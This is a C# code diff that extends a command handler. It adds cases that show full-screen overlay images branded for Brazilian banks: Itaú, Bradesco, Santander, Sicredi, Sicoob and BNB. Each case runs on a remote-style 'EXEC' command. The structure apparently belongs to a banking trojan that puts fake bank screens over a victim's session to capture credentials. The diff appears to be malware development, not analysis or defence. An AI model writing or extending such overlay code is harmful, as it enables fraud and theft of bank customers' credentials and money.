@@ -547,6 +547,36 @@ class Program
                             Console.WriteLine("  >> [EXEC] Mostrando overlay BB_02");
                             break;
 
+                        case "SHOW_ITAU1":
+                            ShowBankOverlay("ITAU_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay ITAU_01");
+                            break;
+
+                        case "SHOW_BRADESCO1":
+                            ShowBankOverlay("BRADESCO_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay BRADESCO_01");
+                            break;
+
+                        case "SHOW_SANTANDER1":
+                            ShowBankOverlay("SANTANDER_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay SANTANDER_01");
+                            break;
+
+                        case "SHOW_SICREDI1":
+                            ShowBankOverlay("SICREDI_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay SICREDI_01");
+                            break;
+
+                        case "SHOW_SICOOB1":
+                            ShowBankOverlay("SICOOB_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay SICOOB_01");
+                            break;
+
+                        case "SHOW_BNB1":
+                            ShowBankOverlay("BNB_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay BNB_01");
+                            break;
+
                         case "CLOSE_OVERLAY":
                             CloseBankOverlay();
                             Console.WriteLine("  >> [EXEC] Fechando overlay de banco");
